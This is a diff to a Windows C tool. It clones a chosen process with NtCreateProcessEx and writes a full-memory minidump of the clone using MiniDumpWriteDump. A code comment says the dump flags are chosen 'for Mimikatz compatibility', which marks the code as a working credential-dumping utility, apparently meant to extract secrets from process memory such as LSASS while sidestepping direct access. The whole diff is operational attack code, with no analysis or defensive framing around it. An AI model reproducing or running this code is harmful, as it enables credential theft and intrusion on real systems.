@@ -51,6 +51,61 @@ typedef NTSTATUS (NTAPI *PNtOpenProcess)(
 // Global function pointer for NtOpenProcess
 static PNtOpenProcess pNtOpenProcess = NULL;
 
+// Define NtCreateProcessEx function pointer type
+typedef NTSTATUS (NTAPI *PNtCreateProcessEx)(
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE ParentProcess,
+    ULONG Flags,
+    HANDLE SectionHandle,
+    HANDLE DebugPort,
+    HANDLE TokenHandle,
+    ULONG JobMemberLevel
+);
+
+// Global function pointer for NtCreateProcessEx
+static PNtCreateProcessEx pNtCreateProcessEx = NULL;
+
+// Minimal MINIDUMP_TYPE definition and MiniDumpWriteDump signature
+typedef enum _MINIDUMP_TYPE {
+    MiniDumpNormal                         = 0x00000000,
+    MiniDumpWithDataSegs                   = 0x00000001,
+    MiniDumpWithFullMemory                 = 0x00000002,
+    MiniDumpWithHandleData                 = 0x00000004,
+    MiniDumpFilterMemory                   = 0x00000008,
+    MiniDumpScanMemory                     = 0x00000010,
+    MiniDumpWithUnloadedModules            = 0x00000020,
+    MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
+    MiniDumpFilterModulePaths              = 0x00000080,
+    MiniDumpWithProcessThreadData          = 0x00000100,
+    MiniDumpWithPrivateReadWriteMemory     = 0x00000200,
+    MiniDumpWithoutOptionalData            = 0x00000400,
+    MiniDumpWithFullMemoryInfo             = 0x00000800,
+    MiniDumpWithThreadInfo                 = 0x00001000,
+    MiniDumpWithCodeSegs                   = 0x00002000,
+    MiniDumpWithoutAuxiliaryState          = 0x00004000,
+    MiniDumpWithFullAuxiliaryState         = 0x00008000,
+    MiniDumpWithPrivateWriteCopyMemory     = 0x00010000,
+    MiniDumpIgnoreInaccessibleMemory       = 0x00020000,
+    MiniDumpWithTokenInformation           = 0x00040000,
+    MiniDumpWithModuleHeaders              = 0x00080000,
+    MiniDumpFilterTriage                   = 0x00100000,
+    MiniDumpValidTypeFlags                 = 0x001fffff
+} MINIDUMP_TYPE;
+
+typedef BOOL (WINAPI *PMiniDumpWriteDump)(
+    HANDLE hProcess,
+    DWORD ProcessId,
+    HANDLE hFile,
+    MINIDUMP_TYPE DumpType,
+    PVOID ExceptionParam,
+    PVOID UserStreamParam,
+    PVOID CallbackParam
+);
+
+static PMiniDumpWriteDump pMiniDumpWriteDump = NULL;
+
 
 // Check if a privilege is already enabled
 BOOL IsPrivilegeEnabled(LPCWSTR privilegeName)
@@ -193,6 +248,40 @@ BOOL LoadNtOpenProcess() {
     return TRUE;
 }
 
+// Load NtCreateProcessEx from ntdll.dll
+BOOL LoadNtCreateProcessEx() {
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    if (hNtdll == NULL) {
+        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    pNtCreateProcessEx = (PNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
+    if (pNtCreateProcessEx == NULL) {
+        printf("\t[!] Failed to get address of NtCreateProcessEx! Error: %lu\n", GetLastError());
+        return FALSE;
+    }
+    printf("\t[i] Successfully loaded NtCreateProcessEx from ntdll.dll\n");
+    return TRUE;
+}
+
+// Load MiniDumpWriteDump from Dbghelp.dll
+BOOL LoadMiniDumpWriteDump() {
+    HMODULE hDbgHelp = LoadLibraryW(L"Dbghelp.dll");
+    if (hDbgHelp == NULL) {
+        printf("\t[!] Failed to load Dbghelp.dll! Error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    pMiniDumpWriteDump = (PMiniDumpWriteDump)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+    if (pMiniDumpWriteDump == NULL) {
+        printf("\t[!] Failed to get address of MiniDumpWriteDump! Error: %lu\n", GetLastError());
+        return FALSE;
+    }
+    printf("\t[i] Successfully loaded MiniDumpWriteDump from Dbghelp.dll\n");
+    return TRUE;
+}
+
 // Find Process Function
 DWORD FindProcess(DWORD pid) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -248,12 +337,40 @@ NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
 }
 
 
+// Clone a process using NtCreateProcessEx, inheriting the parent's address space
+NTSTATUS CloneProcess(HANDLE hParentProcess, PHANDLE hCloneProcess)
+{
+    OBJECT_ATTRIBUTES cloneObjectAttributes;
+
+    cloneObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
+    cloneObjectAttributes.RootDirectory = NULL;
+    cloneObjectAttributes.ObjectName = NULL;
+    cloneObjectAttributes.Attributes = 0;
+    cloneObjectAttributes.SecurityDescriptor = NULL;
+    cloneObjectAttributes.SecurityQualityOfService = NULL;
+
+    return pNtCreateProcessEx(
+        hCloneProcess,
+        PROCESS_ALL_ACCESS,
+        &cloneObjectAttributes,
+        hParentProcess,
+        0,          // Flags
+        NULL,       // SectionHandle (inherit image/VA space)
+        NULL,       // DebugPort
+        NULL,       // TokenHandle
+        0           // JobMemberLevel (Reserved)
+    );
+}
+
+
 int main(int argc, char *argv[]) {
     // Variable Initalization
     DWORD processToClonePid = 0;
     HANDLE hParentProcess = NULL;
+    HANDLE hCloneProcess = NULL;
     NTSTATUS NtStatus;
     char* endptr;
+    HANDLE hDumpFile = INVALID_HANDLE_VALUE;
 
     // Check arguments
     if (argc != 3 || (argc > 0 && argv[0] == "-h")) {
@@ -287,6 +404,20 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
+    // Load NtCreateProcessEx function
+    printf("[i] Loading NtCreateProcessEx function...\n");
+    if (!LoadNtCreateProcessEx()) {
+        printf("\t[!] Failed to load NtCreateProcessEx function!\n");
+        return 1;
+    }
+
+    // Load MiniDumpWriteDump
+    printf("[i] Loading MiniDumpWriteDump...\n");
+    if (!LoadMiniDumpWriteDump()) {
+        printf("\t[!] Failed to load MiniDumpWriteDump!\n");
+        return 1;
+    }
+
     // Checking token privileges
     wprintf(L"[i] Checking token privileges...\n");
     if (!EnablePrivilege())
@@ -303,6 +434,62 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     printf("[i] Target process opened; handle: 0x%p\n", hParentProcess);
+
+    // Clone the target process
+    NtStatus = CloneProcess(hParentProcess, &hCloneProcess);
+    if (hCloneProcess == NULL || NtStatus != STATUS_SUCCESS) {
+        printf("\t [!] Failed to clone target process! NTSTATUS: 0x%08X\n", NtStatus);
+        CloseHandle(hParentProcess);
+        return 1;
+    }
+    printf("[i] Clone process created; handle: 0x%p\n", hCloneProcess);
+
+    // Open dump file (use provided path argv[2])
+    hDumpFile = CreateFileA(
+        argv[2],
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    if (hDumpFile == INVALID_HANDLE_VALUE) {
+        printf("\t[!] Failed to create dump file at '%s'! Error: %lu\n", argv[2], GetLastError());
+        CloseHandle(hCloneProcess);
+        CloseHandle(hParentProcess);
+        return 1;
+    }
+    printf("[i] Dump file opened. Writing minidump...\n");
+
+    // Compose a richer dump type for Mimikatz compatibility
+    MINIDUMP_TYPE dumpType =
+        (MINIDUMP_TYPE)(
+            MiniDumpWithFullMemory |
+            MiniDumpWithHandleData |
+            MiniDumpWithUnloadedModules |
+            MiniDumpWithFullMemoryInfo |
+            MiniDumpWithThreadInfo |
+            MiniDumpWithTokenInformation |
+            MiniDumpWithProcessThreadData |
+            MiniDumpWithModuleHeaders |
+            MiniDumpIgnoreInaccessibleMemory
+        );
+
+    // Write the minidump of the clone
+    if (!pMiniDumpWriteDump(hCloneProcess, GetProcessId(hCloneProcess), hDumpFile, dumpType, NULL, NULL, NULL)) {
+        printf("\t[!] MiniDumpWriteDump failed! Error: %lu\n", GetLastError());
+        CloseHandle(hDumpFile);
+        CloseHandle(hCloneProcess);
+        CloseHandle(hParentProcess);
+        return 1;
+    }
+    printf("[+] Minidump successfully written to '%s'\n", argv[2]);
+
+    // Cleanup
+    CloseHandle(hDumpFile);
+    CloseHandle(hCloneProcess);
+    CloseHandle(hParentProcess);
 
     return 0;
 }
